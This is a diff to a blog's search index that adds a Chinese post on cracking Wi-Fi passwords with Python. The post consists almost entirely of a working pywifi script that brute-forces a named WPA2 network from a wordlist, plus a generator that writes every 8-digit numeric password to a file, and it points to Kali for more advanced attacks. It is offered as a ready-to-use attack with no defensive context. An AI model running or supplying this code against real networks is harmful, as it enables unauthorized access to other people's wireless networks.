@@ -210,4 +210,92 @@ _.compact<span class="token punctuation">(</span><span class="token punctuation"
     <url>/2021/07/10/linux-%E5%9F%BA%E7%A1%80/</url>
     <content><![CDATA[<h2 id="linux-安装-java"><a href="#linux-安装-java" class="headerlink" title="linux 安装 java"></a>linux 安装 java</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum <span class="token function">install</span> java-devel<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
   </entry>
+  <entry>
+    <title>Python Wifi 破解以及生成密码库‘’“</title>
+    <url>/2021/07/10/python-wifi-%E7%A0%B4%E8%A7%A3%E4%BB%A5%E5%8F%8A%E7%94%9F%E6%88%90%E5%AF%86%E7%A0%81%E5%BA%93%E2%80%98%E2%80%99%E2%80%9C/</url>
+    <content><![CDATA[<h1 id="安装python依赖库-pywifi"><a href="#安装python依赖库-pywifi" class="headerlink" title="安装python依赖库 pywifi"></a>安装python依赖库 pywifi</h1><p>#coding:utf-8<br>import pywifi<br>from pywifi import const<br>import time<br>import datetime</p>
+<h1 id="破解代码"><a href="#破解代码" class="headerlink" title="破解代码"></a>破解代码</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#测试连接，返回链接结果</span>
+def wifiConnect<span class="token punctuation">(</span>pwd<span class="token punctuation">)</span>:
+    <span class="token comment">#抓取网卡接口</span>
+    <span class="token assign-left variable">wifi</span><span class="token operator">=</span>pywifi.PyWiFi<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token comment">#获取第一个无线网卡</span>
+    <span class="token assign-left variable">ifaces</span><span class="token operator">=</span>wifi.interfaces<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
+    <span class="token comment">#断开所有连接</span>
+    ifaces.disconnect<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    time.sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+    <span class="token assign-left variable">wifistatus</span><span class="token operator">=</span>ifaces.status<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> wifistatus <span class="token operator">==</span>const.IFACE_DISCONNECTED:
+        <span class="token comment">#创建WiFi连接文件</span>
+        <span class="token assign-left variable">profile</span><span class="token operator">=</span>pywifi.Profile<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token comment">#要连接WiFi的名称</span>
+        profile.ssid<span class="token operator">=</span><span class="token string">"360zc"</span>
+        <span class="token comment">#网卡的开放状态</span>
+        profile.auth<span class="token operator">=</span>const.AUTH_ALG_OPEN
+        <span class="token comment">#wifi加密算法,一般wifi加密算法为wps</span>
+        profile.akm.append<span class="token punctuation">(</span>const.AKM_TYPE_WPA2PSK<span class="token punctuation">)</span>
+        <span class="token comment">#加密单元</span>
+        profile.cipher<span class="token operator">=</span>const.CIPHER_TYPE_CCMP
+        <span class="token comment">#调用密码</span>
+        profile.key<span class="token operator">=</span>pwd
+        <span class="token comment">#删除所有连接过的wifi文件</span>
+        ifaces.remove_all_network_profiles<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token comment">#设定新的连接文件</span>
+        <span class="token assign-left variable">tep_profile</span><span class="token operator">=</span>ifaces.add_network_profile<span class="token punctuation">(</span>profile<span class="token punctuation">)</span>
+        ifaces.connect<span class="token punctuation">(</span>tep_profile<span class="token punctuation">)</span>
+        <span class="token comment">#wifi连接时间</span>
+        time.sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> ifaces.status<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span>const.IFACE_CONNECTED:
+            <span class="token builtin class-name">return</span> True
+        else:
+            <span class="token builtin class-name">return</span> False
+    else:
+        print<span class="token punctuation">(</span><span class="token string">"已有wifi连接"</span><span class="token punctuation">)</span> 
+<span class="token comment">#读取密码本</span>
+def readPassword<span class="token punctuation">(</span><span class="token punctuation">)</span>:
+    print<span class="token punctuation">(</span><span class="token string">"开始破解:"</span><span class="token punctuation">)</span>
+    <span class="token comment">#密码本路径</span>
+    <span class="token assign-left variable">path</span><span class="token operator">=</span><span class="token string">"D:\个人文档\学习资料\网络攻防\wifi\password.txt"</span>
+    <span class="token comment">#打开文件</span>
+    <span class="token assign-left variable">file</span><span class="token operator">=</span>open<span class="token punctuation">(</span>path,<span class="token string">"r"</span><span class="token punctuation">)</span>
+    <span class="token keyword">while</span> True:
+        try:
+            <span class="token comment">#一行一行读取</span>
+            <span class="token assign-left variable">pad</span><span class="token operator">=</span>file.readline<span class="token punctuation">(</span><span class="token punctuation">)</span>
+            <span class="token assign-left variable">bool</span><span class="token operator">=</span>wifiConnect<span class="token punctuation">(</span>pad<span class="token punctuation">)</span>
+            
+            <span class="token keyword">if</span> bool:
+                print<span class="token punctuation">(</span><span class="token string">"密码已破解： "</span>,pad<span class="token punctuation">)</span>
+                print<span class="token punctuation">(</span><span class="token string">"WiFi已自动连接！！！"</span><span class="token punctuation">)</span>
+                <span class="token builtin class-name">break</span>
+            else:
+                <span class="token comment">#跳出当前循环，进行下一次循环</span>
+                print<span class="token punctuation">(</span><span class="token string">"密码破解中....密码校对: "</span>,pad<span class="token punctuation">)</span>
+        except:
+            <span class="token builtin class-name">continue</span>
+ 
+<span class="token assign-left variable">start</span><span class="token operator">=</span>datetime.datetime.now<span class="token punctuation">(</span><span class="token punctuation">)</span> 
+readPassword<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token assign-left variable">end</span><span class="token operator">=</span>datetime.datetime.now<span class="token punctuation">(</span><span class="token punctuation">)</span>
+print<span class="token punctuation">(</span><span class="token string">"破解WIFI密码一共用了多长时间：&#123;&#125;"</span>.format<span class="token punctuation">(</span>end-start<span class="token punctuation">))</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h1 id="生成密码库"><a href="#生成密码库" class="headerlink" title="生成密码库"></a>生成密码库</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">import</span> itertools as its
+<span class="token function">import</span> datetime
+ 
+<span class="token comment">#记录程序运行时间</span>
+<span class="token assign-left variable">start</span><span class="token operator">=</span>datetime.datetime.now<span class="token punctuation">(</span><span class="token punctuation">)</span>
+words <span class="token operator">=</span> <span class="token string">'1234567890'</span><span class="token comment">#这里可以加入字母和其他字符，使用string包更方便</span>
+<span class="token comment">#生成密码的位数</span>
+r <span class="token operator">=</span> its.product<span class="token punctuation">(</span>words,repeat<span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token comment">#4即生成4位密码，正常情况下热点密码位数为8</span>
+dic <span class="token operator">=</span>open<span class="token punctuation">(</span>r<span class="token string">"D:\个人文档\学习资料\网络攻防\wifi\paswwer.txt"</span>,<span class="token string">'a'</span><span class="token punctuation">)</span>
+<span class="token keyword">for</span> <span class="token for-or-select variable">i</span> <span class="token keyword">in</span> r:
+    dic.write<span class="token punctuation">(</span><span class="token string">''</span>.join<span class="token punctuation">(</span>i<span class="token punctuation">))</span>
+    dic.write<span class="token punctuation">(</span><span class="token string">''</span>.join<span class="token punctuation">(</span><span class="token string">'<span class="token entity" title="\n">\n</span>'</span><span class="token punctuation">))</span>
+    print<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
+ 
+dic.close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+print<span class="token punctuation">(</span><span class="token string">'密码本生成好了'</span><span class="token punctuation">)</span>
+<span class="token assign-left variable">end</span><span class="token operator">=</span>datetime.datetime.now<span class="token punctuation">(</span><span class="token punctuation">)</span>
+print<span class="token punctuation">(</span><span class="token string">"生成密码本一共用了多长时间：&#123;&#125;"</span>.format<span class="token punctuation">(</span>end-start<span class="token punctuation">))</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h1 id="适用于重英文的wifi名"><a href="#适用于重英文的wifi名" class="headerlink" title="适用于重英文的wifi名"></a>适用于重英文的wifi名</h1><p>更高级的破解wifi 使用kail和无线网卡<br>未完待续</p>
+]]></content>
+  </entry>
 </search>
